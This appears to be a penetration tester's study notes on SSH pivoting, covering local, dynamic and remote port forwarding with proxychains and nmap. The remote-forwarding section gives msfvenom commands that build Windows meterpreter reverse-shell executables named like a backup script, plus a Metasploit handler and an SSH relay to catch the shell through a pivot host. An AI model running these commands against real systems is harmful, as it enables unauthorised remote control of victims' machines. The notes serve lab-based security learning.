#### Local Port Forwarding

This setup creates a new port on your local machine (`[local_port]`), which forwards traffic to a specific destination on the remote machine (`[target_ip]:[target_port]`). If a service is accessible remotely on a particular IP and port, local port forwarding allows you to access it through your machine's port.

```bash
ssh {-N} -L [local_port]:[target_ip]:[target_port] [user]@[target]
```

Examples:

Opens 3389 locally. Connected to 3389 locally will forward traffic to 10.1.1.10 on port 3389:

```bash
ssh {-N} -L 3389:10.1.1.10:3389 [user]@[target]
```

```bash
 ssh {-N} -L [local_port]:127.0.0.1:[target_port] [user]@[target]
```

#### Port Forwarding Multiple Ports

```bash
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```

Example:

```bash
ssh -L [local_port]:[target_ip]:[target_port] -L [local_port]:[target_ip]:[target_port] [user]@[target]
```

#### Dynamic Port Forwarding

Useful when we don't know what port we need to connect to. To be used with `proxychains` or a `socks4/5` connection in a web browser. `socks4` only supports `TCP` whereas `sock5` supports both `TCP` and `UDP`.

```bash
sudo ssh {-N} -D 127.0.0.1:1080 [user]@[target]
```

Proxychains Config:

```bash
socks5	127.0.0.1 1080
```

Then use proxychains with `nmap` to scan a target:

```bash
proxychains -q nmap -sT -Pn x.x.x.x
```

For web browsing, configure a suitable proxy:

![[Pasted image 20250203111426.png]]

Can also use other applications with proxychains:

```bash
proxychains -q msfconsole -q
proxychains xfreerdp
```
### Remote Port Forwarding

This setup allows the attacker's machine to receive connections on a specified port and forward traffic through an intermediary **pivot point** to reach a service running locally on the target machine. Since the target has no direct route to the attacker, a reverse shell or direct connection would fail. However, the pivot point, which has communication with both the attacker and the target, can act as a bridge.

![[Pasted image 20250203121025.png]]

Example Using Metasploit to obtain a shell on the Target:

```bash
msfvenom -p windows/x64/meterpreter/reverse_https lhost=<pivot_point> -f exe -o backupscript.exe LPORT=<port_to_listen_to_on_pivot_point>
```

Transfer exe to Target.

From Attacker:

```bash
ssh -R <PivotPointIP>:<port_to_listen_to_on_pivot_point>:0.0.0.0:<attacker_listen_port> ubuntu@<PivotPointIP> -vN
```

Example:

MSFVenom:

- 172.16.8.120 - IP address of second interface on `Pivot Point` 
- 443 - Port it listen on the `Pivot Point`

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.8.120 LPORT=443 -f exe > shell.exe
```

Metasploit:

- 0.0.0.0 - All interfaces
- 445 - Port open on `Attacker`

```bash
msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 0.0.0.0;set LPORT 445;run;"
```

SSH - From Attacker:

- 172.16.8.120 - IP address of second interface on `Pivot Point`
- 443 - Port it listen on the `Pivot Point`
- 445 - Port to open on `Attacker`

```bash
 ssh -R 172.16.8.120:443:0.0.0.0:445 root@10.129.161.232
```